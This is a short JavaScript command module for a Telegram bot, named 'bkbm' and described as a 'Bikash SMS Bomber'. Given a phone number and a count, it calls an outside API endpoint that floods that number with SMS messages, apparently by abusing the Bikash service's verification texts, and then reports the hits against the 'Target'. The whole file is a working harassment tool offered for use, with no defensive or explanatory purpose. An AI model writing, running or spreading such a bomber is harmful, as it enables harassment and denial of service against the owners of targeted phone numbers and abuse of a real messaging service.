const axios = require('axios');
const dipto = "https://www.noobs-api.rf.gd";

module.exports.config = {
  name: "bkbm",
  version: "2.0",
  author: "Shaon Ahmed",
  role: 1,
  description: "Bikash SMS Bomber for Telegram",
  command: "/bkbm [number] [limit]",
  cooldown: 5
};

module.exports.run = async (api, msg, match) => {
  try {
    // Ensure msg and match exist
    if (!msg || !msg.chat || !match || !match[1]) {
      return api.sendMessage(msg?.chat?.id || msg?.from?.id, "🔴 | Error: Invalid usage or internal error.");
    }

    const chatId = msg.chat.id;
    const number = match[1];
    const limit = match[2] || 10;

    if (!/^[0-9]+$/.test(number)) {
      return api.sendMessage(chatId, "🔴 | Error: Invalid phone number!");
    }

    if (limit > 15) {
      return api.sendMessage(chatId, "🔴 | Error: Maximum limit is 15!");
    }

    const processingMessage = await api.sendMessage(chatId, "💣 | Activating Bikash Bomber...");

    const { data } = await axios.get(`${dipto}/dipto/bikashBomber?number=${encodeURIComponent(number)}&limit=${limit}`);

    await api.deleteMessage(chatId, processingMessage.message_id);

    return api.sendMessage(chatId, `
⚡ Bikash Bomber Results ⚡

📱 Target: ${number}
💣 Total: ${data.success + data.failed}
✅ Success: ${data.success}
❌ Failed: ${data.failed}

📊 Status: ${data.message}
    `.trim());

  } catch (error) {
    console.error("Bomber Error:", error);
    const fallbackId = msg?.chat?.id || msg?.from?.id;
    return api.sendMessage(fallbackId, `🔴 | Bomber Failed! ${error.message}`);
  }
};
